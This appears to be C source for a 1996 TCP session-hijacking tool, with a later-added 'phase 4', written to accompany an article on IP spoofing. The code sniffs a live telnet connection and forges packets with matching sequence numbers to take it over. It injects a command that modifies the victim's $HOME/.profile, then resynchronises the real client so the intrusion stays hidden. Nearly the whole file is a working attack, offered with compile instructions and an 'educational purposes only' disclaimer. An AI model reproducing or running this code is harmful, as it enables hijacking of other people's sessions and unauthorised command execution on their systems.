/*---=[ hijack.c ]=-------------------------------------------------------*/
/**************************************************************************/
/*  Hijack - Example program on connection hijacking with IP spoofing     */
/*               (illustration for 'A short overview of IP spoofing')     */
/*                                                                        */
/*  Purpose - taking control of a running telnet session, and executing   */
/*            our own command in that shell.                              */
/*                                                                        */
/*  Author - Brecht Claerhout <Coder@reptile.rug.ac.be>                   */
/*           Serious advice, comments, statements, greets, always welcome */
/*           flames, moronic 3l33t >/dev/null                             */
/*                                                                        */
/*  Disclaimer - This program is for educational purposes only. I am in   */
/*               NO way responsible for what you do with this program,    */
/*               or any damage you or this program causes.                */
/*                                                                        */
/*  For whom - People with a little knowledge of TCP/IP, C source code    */ 
/*             and general UNIX. Otherwise, please keep your hands of,    */
/*             and catch up on those things first.                        */
/*                                                                        */
/*  Limited to - Linux 1.3.X or higher.                                   */
/*               ETHERNET support ("eth0" device)                         */
/*               If you network configuration differs it shouldn't be to  */
/*               hard to modify yourself. I got it working on PPP too,    */
/*               but I'm not including extra configuration possibilities  */
/*               because this would overload this first release that is   */
/*               only a demonstration of the mechanism.                   */
/*               Anyway if you only have ONE network device (slip,        */
/*               ppp,... ) after a quick look at this code and spoofit.h  */
/*               it will only take you a few secs to fix it...            */
/*               People with a bit of C knowledge and well known with     */
/*               their OS shouldn't have to much trouble to port the code.*/
/*               If you do, I would love to get the results.              */
/*                                                                        */
/*  Compiling - gcc -o hijack hijack.c                                    */
/*                                                                        */
/*  Usage - Usage described in the spoofing article that came with this.  */
/*          If you didn't get this, try to get the full release...        */ 
/*                                                                        */
/*  See also - Sniffit (for getting the necessairy data on a connection)  */
/**************************************************************************/

#include "spoofit.h"    /* My spoofing include.... read licence on this */

/* Those 2 'defines' are important for putting the receiving device in  */
/* PROMISCUOUS mode                                                     */
#define INTERFACE			"eth0"    /* first ethernet device          */
#define INTERFACE_PREFIX	14    	  /* 14 bytes is an ethernet header */

#define PERSONAL_TOUCH		666

int fd_receive, fd_send;
char CLIENT[100],SERVER[100];
int CLIENT_P;

void main(int argc, char *argv[]) {  // @params: client IP, client port, server IP
	int i,j,count;
	struct sp_wait_packet attack_info;
	unsigned long sp_seq ,sp_ack;
	unsigned long old_seq ,old_ack;
	unsigned long serv_seq ,serv_ack;

	/* This data used to clean up the shell line */
	char to_data[]={0x08, 0x08,0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x0a, 0x0a};
	char evil_data[]="echo \"echo HACKED\" >>$HOME/.profile\n";

	/* manual */
	if(argc!=4) {
		printf("Usage: %s client client_port server\n",argv[0]);
		exit(1);
	}

	strcpy(CLIENT,argv[1]);  // client IP
	CLIENT_P=atoi(argv[2]);  // client port
	strcpy(SERVER,argv[3]);  // server IP

	/* preparing all necessary sockets (sending + receiving) */
	DEV_PREFIX = INTERFACE_PREFIX;
	fd_send = open_sending();
	fd_receive = open_receiving(INTERFACE, 0);  /* normal BLOCKING mode */

	printf("Starting Hijacking demo - Brecht Claerhout 1996\n");
	printf("-----------------------------------------------\n");

	/*
	 * phase 1: steal connection by inpersonating client and send packet to server
	 */
	for (j = 0; j < 50; ++j) {
		printf("\nTakeover phase 1: Stealing connection.\n");
		/* 1. Wait for telnet packet from client to server, and store packet info to attack_info */
		wait_packet(fd_receive, &attack_info, CLIENT, CLIENT_P, SERVER, 23, ACK|PSH, 0);
		/* 2. Calculate the next sequence number and ack from client to server */
		sp_seq = attack_info.seq + attack_info.datalen;
		sp_ack=attack_info.ack;
		/* 3. Send the faked packet to server to clear the shell */
		printf("  Sending Spoofed clean-up data...\n");
		transmit_TCP(fd_send, to_data, 0, 0, sizeof(to_data),
			CLIENT, CLIENT_P, SERVER, 23, sp_seq, sp_ack, ACK|PSH);
		/* NOTE: always beware you receive y'r OWN spoofed packs! */
		/*       so handle it if necessary                         */
		count=0;
		printf("  Waiting for spoof to be confirmed...\n");
		while(count < 5) {
			/* 4. Wait for telnet packet from server to client */
			wait_packet(fd_receive, &attack_info, SERVER, 23, CLIENT, CLIENT_P, ACK, 0);
			/* 5. Check if the ack number match the faked packet */
			if(attack_info.ack == sp_seq + sizeof(to_data)) count = PERSONAL_TOUCH;
			else ++count;
		};
		if (count != PERSONAL_TOUCH) { printf("Phase 1 unsuccesfully ended.\n"); }
		else { printf("Phase 1 ended.\n"); break; };
	};

	/*
	 * phase 2: Check whether the true client is disturbed, and get server ack and seq
	 */
	printf("\nTakeover phase 2: Getting on track with SEQ/ACK's again\n");
	count = serv_seq = old_ack = 0;
	while (count < 10) {
		old_seq = serv_seq;
		old_ack = serv_ack;
		/* 1. Wait for telnet ack packet from server to client */
		wait_packet(fd_receive, &attack_info, SERVER, 23, CLIENT, CLIENT_P, ACK, 0);
		if (attack_info.datalen == 0) {
			/* 2. Get server seq and ack */
			serv_seq = attack_info.seq + attack_info.datalen;
			serv_ack = attack_info.ack;
			/* 3. Success if seq and ack do not change */
			if ((old_seq == serv_seq) && (serv_ack==old_ack)) count = PERSONAL_TOUCH;
			else ++count;
		}
	};
	if (count != PERSONAL_TOUCH) { printf("Phase 2 unsuccesfully ended.\n"); exit(0); }
	printf("  Server SEQ: %X (hex)    ACK: %X (hex)\n", serv_seq, serv_ack);
	printf("Phase 2 ended.\n");

	/*
	 * phase 3: send the evil data
	 */
	printf("\nTakeover phase 3: Sending MY data.\n");
	printf("  Sending evil data.\n");
	/* 1. Send the faked packet containing evil data to server */
	transmit_TCP(fd_send, evil_data, 0, 0, sizeof(evil_data),
		CLIENT, CLIENT_P, SERVER, 23, serv_ack, serv_seq, ACK|PSH);
	count = 0;
	printf("  Waiting for evil data to be confirmed...\n");
	while (count < 5) {
		/* 2. Wait for ack packet from server */
		wait_packet(fd_receive, &attack_info, SERVER, 23, CLIENT, CLIENT_P, ACK, 0);
		/* 3. The ack number matches the evil packet, success */
		if (attack_info.ack == serv_ack + sizeof(evil_data)) count = PERSONAL_TOUCH;
		else ++count;
	};
	if(count != PERSONAL_TOUCH) { printf("Phase 3 unsuccesfully ended.\n"); exit(0); }
	printf("Phase 3 ended.\n");

	/*
	 * newly added codes go here
	 * phase 4: restore connection of the true client
	 */
	printf("\nTakeover phase 4: Restoring connection.\n");
    serv_ack += sizeof(evil_data);  // correct seq to be sent from client to server
    do {
        /* 1. Wait for packet from client*/
        wait_packet(fd_receive, &attack_info, CLIENT, CLIENT_P, SERVER, 23, PSH, 0);
        /* 2. Get seq and ack */
        sp_seq = attack_info.seq;
        sp_ack = attack_info.ack;
        printf("  Client seq: %x, ack: %x\n", sp_seq, sp_ack);
        /* 3. Send ack to client to correct its seq by datalen */
        transmit_TCP(fd_send, "", 0, 0, 0,
            SERVER, 23, CLIENT, CLIENT_P, sp_ack, sp_seq + attack_info.datalen, ACK);
    } while (sp_seq < serv_ack - 1);  // repeat until the seq is correct
	printf("Phase 4 ended.\n");
}
